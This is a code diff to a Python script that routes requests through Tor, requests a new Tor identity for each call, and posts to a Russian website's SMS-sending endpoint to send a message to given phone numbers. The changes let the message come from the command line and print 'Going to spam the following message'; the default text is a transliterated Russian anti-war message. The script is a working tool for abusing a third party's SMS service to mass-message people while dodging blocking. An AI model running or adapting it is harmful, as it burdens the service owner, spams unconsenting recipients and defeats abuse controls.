@@ -3,10 +3,12 @@ import re
 import textwrap
 import requests
 import time
+import sys
 from stem import Signal
 from stem.control import Controller
 import socks, socket
 
+msg = "Vashy voiny ubivaiut mirnoe naselenie v Ukraine"
 
 def call_me(num):
 	controller.signal(Signal.NEWNYM)
@@ -19,7 +21,7 @@ def call_me(num):
 		url='http://ossinfo.ru/functions/custom.php',
 		data={
 			"method": "sendSms",
-			"params[message]": "Vashy voiny ubivaiut mirnoe naselenie v Ukraine",
+			"params[message]": msg,
 			"params[number]": f"+{num}",
 			"params[transliterate]": "false"
 		},
@@ -30,6 +32,11 @@ def call_me(num):
 	)
 	print(response.text)
 
+
+if len(sys.argv) >= 2:
+  msg = sys.argv[1]
+
+print(f"Going to spam the following message:\n{msg}")
 
 with Controller.from_port(port=9051) as controller:
 	controller.authenticate(password='')
